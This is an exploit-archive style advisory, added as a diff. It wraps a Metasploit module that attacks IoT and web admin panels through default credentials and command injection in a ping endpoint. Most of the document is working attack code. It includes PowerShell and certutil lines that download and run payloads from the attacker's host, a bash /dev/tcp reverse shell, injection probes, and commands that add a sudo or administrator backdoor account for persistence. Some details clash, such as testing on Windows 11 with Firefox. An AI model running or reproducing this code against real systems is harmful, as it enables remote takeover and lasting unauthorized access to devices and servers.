@@ -1,0 +1,294 @@
+=============================================================================================================================================
+| # Title     : Netbus Backdoor 1.7 From Legacy to Modern IoT Risks Full RCE Threat                                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available                                                                 |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/213263/ & MVID-2025-0703
+
+[+] Summary    : This document traces the evolution of a Metasploit module concept from an initial theoretical/historical analysis of the 1998 NetBus backdoor to a practical, 
+                 modern exploit module targeting insecure credential storage vulnerabilities. 
+				 The journey highlights critical distinctions between academic research modules and production-ready exploits.
+
+[+] Evolution of Exploitation Techniques :
+
+1998 NetBus Model
+    ↓
+Core Vulnerability: Insecure Credential Storage
+    ↓
+Modern Manifestations:
+
+• IoT devices with default passwords
+• Web admin panels with hardcoded credentials  
+• Industrial control systems with backdoor accounts
+    ↓
+Modern Exploitation Methods:
+
+• Authentication bypass → Command injection
+• File upload → Remote code execution
+• Privilege escalation → Persistent access
+
+[+] POC :
+
+##
+# This module exploits the "Insecure Credential Storage" vulnerability in modern systems
+# Similar to the NetBus principle but in modern web applications
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'IoT Device Backdoor Credential RCE',
+      'Description'    => %q{
+        This module exploits two common vulnerabilities in IoT devices and embedded systems:
+        1. Insecure credential storage (default/static passwords)
+        2. Command injection via system management interface
+
+        The module simulates a realistic scenario similar to NetBus but in a modern context.
+      },
+      'Author'         => [
+        'indoushka',
+        'Based on NetBus research by John Page (hyp3rlinx)'
+      ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['URL', 'https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password'],
+        ['CWE', '798'],  # Use of Hard-coded Credentials
+        ['CWE', '78'],   # OS Command Injection
+        ['TTP', 'T1078'], # Valid Accounts
+        ['TTP', 'T1059']  # Command and Scripting Interpreter
+      ],
+      'Platform'       => ['linux', 'unix', 'win'],
+      'Arch'           => [ARCH_X86, ARCH_X64, ARCH_ARMLE],
+      'Targets'        => [
+        ['Linux (x86/x64)', { 'Platform' => 'linux', 'Arch' => [ARCH_X86, ARCH_X64] }],
+        ['Linux (ARM)',    { 'Platform' => 'linux', 'Arch' => ARCH_ARMLE }],
+        ['Windows',        { 'Platform' => 'win',   'Arch' => [ARCH_X86, ARCH_X64] }]
+      ],
+      'Privileged'     => true,
+      'DisclosureDate' => '2023-01-01',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'Base path to the vulnerable endpoint', '/']),
+      OptString.new('USERNAME', [true, 'Default/backdoor username', 'admin']),
+      OptString.new('PASSWORD', [true, 'Default/backdoor password', 'admin']),
+      OptString.new('BACKDOOR_USER', [false, 'Username to add for persistence', 'backdoor']),
+      OptString.new('BACKDOOR_PASS', [false, 'Password for the new user', 'P@ssw0rd123!'])
+    ])
+  end
+
+  def check
+    # Step 1: Check for default credentials
+    print_status("Checking for default credentials...")
+    
+    res = send_login_request
+    
+    if res && res.code == 200 && res.body.include?('success')
+      return Exploit::CheckCode::Vulnerable
+    elsif res && res.code == 401
+      return Exploit::CheckCode::Safe
+    end
+    
+    Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    print_status("Attempting to exploit insecure credential storage...")
+    
+    # 1. Authenticate using insecure credentials
+    unless authenticate
+      fail_with(Failure::NoAccess, 'Authentication failed')
+    end
+    
+    print_good("Successfully authenticated with default credentials!")
+    
+    # 2. Use appropriate execution method based on target system
+    case target['Platform']
+    when 'linux'
+      exploit_linux
+    when 'win'
+      exploit_windows
+    else
+      exploit_generic
+    end
+  end
+
+  private
+
+  def send_login_request
+    send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, 'login.php'),
+      'vars_post' => {
+        'username' => datastore['USERNAME'],
+        'password' => datastore['PASSWORD']
+      },
+      'headers'  => {
+        'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)'
+      }
+    })
+  end
+
+  def authenticate
+    print_status("Authenticating as #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+    
+    res = send_login_request
+    
+    if res && res.code == 200
+      # Check for authentication success in response
+      if res.body.include?('success') || res.body.include?('dashboard') || res.get_cookies.include?('session')
+        @auth_cookies = res.get_cookies
+        return true
+      end
+    end
+    
+    false
+  end
+
+  def exploit_linux
+    print_status("Target is Linux, using command injection...")
+    
+    # Method 1: Direct Command Injection
+    if try_command_injection
+      return
+    end
+    
+    # Method 2: Command Stager (to upload and execute payload)
+    print_status("Attempting command stager delivery...")
+    
+    execute_cmdstager(
+      flavor: :curl,
+      delay: 0.5
+    )
+  end
+
+  def exploit_windows
+    print_status("Target is Windows, using PowerShell/Command Prompt...")
+    
+    # 1. Try PowerShell
+    powershell_cmd = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://#{datastore['LHOST']}:#{datastore['SRVPORT']}/shell.ps1')\""
+    
+    if execute_command(powershell_cmd)
+      return
+    end
+    
+    # 2. Try CertUtil (common alternative in Windows)
+    certutil_cmd = "certutil -urlcache -f http://#{datastore['LHOST']}:#{datastore['SRVPORT']}/payload.exe C:\\Windows\\Temp\\payload.exe && C:\\Windows\\Temp\\payload.exe"
+    
+    execute_command(certutil_cmd)
+  end
+
+  def exploit_generic
+    print_status("Using generic exploitation method...")
+    
+    # Direct command execution to return Shell
+    cmd = "bash -c 'bash -i >& /dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 0>&1'"
+    
+    execute_command(cmd)
+  end
+
+  def try_command_injection
+    print_status("Testing for command injection...")
+    
+    test_cmds = [
+      '; id;', 
+      '| id |',
+      '`id`',
+      '$(id)',
+      '|| id ||'
+    ]
+    
+    test_cmds.each do |injector|
+      cmd = "ping #{injector}"
+      if execute_command(cmd, check_pattern: 'uid=')
+        return true
+      end
+    end
+    
+    false
+  end
+
+  def execute_command(cmd, opts = {})
+    uri = normalize_uri(target_uri.path, 'admin', 'ping.php')
+    
+    # Inject command into parameter
+    payload = {
+      'host' => "127.0.0.1 #{cmd}",
+      'count' => '1'
+    }
+    
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => uri,
+      'cookie'    => @auth_cookies,
+      'vars_post' => payload,
+      'timeout'   => 5
+    })
+    
+    if opts[:check_pattern] && res && res.body.include?(opts[:check_pattern])
+      print_good("Command injection successful!")
+      print_line("Output: #{res.body}")
+      return true
+    end
+    
+    false
+  rescue ::Exception => e
+    print_error("Error executing command: #{e.message}")
+    false
+  end
+
+  # Add user for persistence (Backdoor)
+  def add_backdoor_user
+    return unless datastore['BACKDOOR_USER'] && datastore['BACKDOOR_PASS']
+    
+    print_status("Adding backdoor user #{datastore['BACKDOOR_USER']}...")
+    
+    case target['Platform']
+    when 'linux'
+      cmds = [
+        "useradd -m -s /bin/bash #{datastore['BACKDOOR_USER']}",
+        "echo '#{datastore['BACKDOOR_USER']}:#{datastore['BACKDOOR_PASS']}' | chpasswd",
+        "usermod -aG sudo #{datastore['BACKDOOR_USER']} 2>/dev/null || usermod -aG wheel #{datastore['BACKDOOR_USER']} 2>/dev/null"
+      ]
+      
+    when 'win'
+      cmds = [
+        "net user #{datastore['BACKDOOR_USER']} #{datastore['BACKDOOR_PASS']} /add",
+        "net localgroup administrators #{datastore['BACKDOOR_USER']} /add"
+      ]
+    end
+    
+    cmds.each { |cmd| execute_command(cmd) }
+    
+    print_good("Backdoor user added successfully!")
+  end
+
+  def on_new_session(client)
+    super
+    
+    # After obtaining session, add backdoor user
+    add_backdoor_user if client.type == 'meterpreter' || client.type == 'shell'
+    
+    # User tips
+    print_good("Tips for post-exploitation:")
+    print_line("1. Check system info: cat /etc/os-release || systeminfo")
+    print_line("2. Look for interesting files: find / -type f -name '*.txt' -o -name '*.conf' 2>/dev/null")
+    print_line("3. Check network connections: netstat -antup || ss -tunap")
+    
+    if datastore['BACKDOOR_USER']
+      print_line("4. Backdoor credentials: #{datastore['BACKDOOR_USER']} / #{datastore['BACKDOOR_PASS']}")
+    end
+  end
+end
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
